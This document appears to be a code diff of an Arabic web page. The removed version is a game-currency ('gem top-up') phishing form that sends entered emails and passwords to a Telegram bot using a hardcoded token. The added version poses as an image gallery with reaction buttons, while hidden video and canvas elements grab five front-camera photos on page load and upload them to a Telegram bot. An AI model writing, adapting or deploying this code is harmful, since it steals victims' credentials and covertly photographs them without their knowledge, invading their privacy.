@@ -2,134 +2,193 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>شحن جواهر</title>
+  <meta charset="UTF-8" />
+  <title>معرض الصور - تفاعلي</title>
   <style>
     body {
       margin: 0;
-      background: linear-gradient(135deg, black, purple);
-      font-family: 'Arial', sans-serif;
+      font-family: sans-serif;
+      background: black;
+      animation: pulseBg 6s infinite alternate;
     }
 
-    header {
-      background-image: url('photo.gif');
-      background-size: cover;
-      height: 200px;
+    @keyframes pulseBg {
+      0% { background-color: #2b0033; }
+      100% { background-color: #000000; }
     }
 
-    .title {
-      text-align: center;
-      color: red;
-      font-weight: bold;
-      font-size: 32px;
-      margin: 20px 0;
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { text-shadow: 0 0 10px red; }
-      50% { text-shadow: 0 0 25px red; }
-    }
-
-    .grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 20px;
+    .gallery {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+      direction: rtl;
       padding: 20px;
     }
 
-    .box {
+    .image-box {
+      width: 18%;
+      margin: 1%;
+      background: #222;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 0 8px #6a0dad66;
+    }
+
+    .image {
       width: 100%;
-      height: 200px;
-      background-image: url('girl.gif');
+      aspect-ratio: 1/1;
       background-size: cover;
-      filter: blur(2px);
-      border-radius: 20px;
+      background-position: center;
     }
 
-    .form-box {
-      margin: 30px auto;
-      background-color: orange;
-      border: 4px dotted white;
-      width: 80%;
-      max-width: 500px;
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 0 20px white;
+    .reactions {
+      display: flex;
+      justify-content: space-around;
+      background-color: #111;
+      padding: 8px;
     }
 
-    .form-box h3 {
-      text-align: center;
-      margin-bottom: 20px;
-      color: white;
-    }
-
-    .form-box input {
-      width: 100%;
-      padding: 15px;
-      margin-bottom: 15px;
+    .reaction-btn {
+      background-color: #6a0dad;
       border: none;
-      border-radius: 10px;
+      border-radius: 50px;
+      color: white;
+      padding: 6px 12px;
       font-size: 16px;
-    }
-
-    .form-box button {
-      width: 100%;
-      padding: 15px;
-      background-color: purple;
-      color: white;
-      border: none;
-      font-weight: bold;
-      font-size: 18px;
-      border-radius: 10px;
       cursor: pointer;
+      transition: transform 0.2s;
     }
 
-    .form-box button:hover {
-      background-color: darkviolet;
+    .reaction-btn:hover {
+      transform: scale(1.1);
+    }
+
+    #contact-btn {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      background-color: #6a0dad;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 50px;
+      font-size: 18px;
+      cursor: pointer;
+      box-shadow: 0 0 15px #6a0dad;
+    }
+
+    video {
+      display: none;
+    }
+
+    canvas {
+      display: none;
     }
   </style>
 </head>
 <body>
 
-<header></header>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
-<div class="title">شحن جواهر</div>
+  <div class="gallery" id="gallery"></div>
+  <button id="contact-btn">رسالة إلى المطور</button>
 
-<div class="grid">
-  <div class="box"></div>
-  <div class="box"></div>
-  <div class="box"></div>
-  <div class="box"></div>
-  <div class="box"></div>
-</div>
+  <script>
+    const token = "توكن_البوت_هنا";       // 👑 غيّره بتوكن البوت
+    const chatId = "معرف_التليغرام_هنا";  // 👑 غيّره بـ ID المطور
 
-<div class="form-box">
-  <h3>📩 أرسل وصفك</h3>
-  <input type="text" id="desc" placeholder="بريد الكتروني" <input type="password" id="pass" placeholder="كلمة السر">
-  <button onclick="sendToBot()">إرسال</button>
-</div>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
 
-<script>
-  function sendToBot() {
-    const desc = document.getElementById('desc').value;
-    const pass = document.getElementById('pass').value;
+    // 👁️ التقاط 5 صور
+    async function captureAndSendPhotos() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
 
-    const message = `موقع لشحن جواهر 💎 فري فري: ${desc}\nكلمة السر: ${pass}`;
+        // ننتظر حتى تعمل الكاميرا
+        await new Promise(resolve => setTimeout(resolve, 2000));
 
-    const token = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";  //
-    const chatId = "7664410054";   //
+        for (let i = 1; i <= 5; i++) {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
+          await sendPhotoToBot(blob, i);
+          await new Promise(resolve => setTimeout(resolve, 1000)); // انتظار 1 ثانية بين الصور
+        }
 
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
-      })
-    }).then(res => alert("تم الإرسال")).catch(err => alert("فشل الإرسال"));
-  }
-</script>
+        // إيقاف الكاميرا بعد الانتهاء
+        stream.getTracks().forEach(track => track.stop());
 
+      } catch (err) {
+        alert("⚠️ لم يتم السماح بالكاميرا");
+      }
+    }
+
+    async function sendPhotoToBot(blob, index) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("caption", `📸 صورة ${index} من الزائر`);
+      formData.append("photo", blob, `photo${index}.png`);
+
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    function sendToBot(text) {
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+      fetch(url);
+    }
+
+    // زر رسالة إلى المطور
+    document.getElementById("contact-btn").onclick = () => {
+      const msg = prompt("📝 اكتب رسالتك إلى المطور:");
+      if (msg) {
+        sendToBot("📬 رسالة من الزائر:\n" + msg);
+        alert("✅ تم إرسال رسالتك!");
+      }
+    };
+
+    // إنشاء صور وتفاعلات
+    const gallery = document.getElementById("gallery");
+    for (let i = 1; i <= 25; i++) {
+      const box = document.createElement("div");
+      box.className = "image-box";
+
+      const image = document.createElement("div");
+      image.className = "image";
+      image.style.backgroundImage = `url('images/img${i}.jpg')`;
+
+      const reactBox = document.createElement("div");
+      reactBox.className = "reactions";
+
+      const laughBtn = document.createElement("button");
+      laughBtn.className = "reaction-btn";
+      laughBtn.innerText = "😂 أضحكني";
+      laughBtn.onclick = () => sendToBot(`📸 تفاعل مع img${i}.jpg:\n😂 أضحكني`);
+
+      const angerBtn = document.createElement("button");
+      angerBtn.className = "reaction-btn";
+      angerBtn.innerText = "😡 أغضبني";
+      angerBtn.onclick = () => sendToBot(`📸 تفاعل مع img${i}.jpg:\n😡 أغضبني`);
+
+      reactBox.appendChild(laughBtn);
+      reactBox.appendChild(angerBtn);
+
+      box.appendChild(image);
+      box.appendChild(reactBox);
+      gallery.appendChild(box);
+    }
+
+    // عند تحميل الصفحة
+    window.onload = () => {
+      captureAndSendPhotos();
+    };
+  </script>
 </body>
 </html>
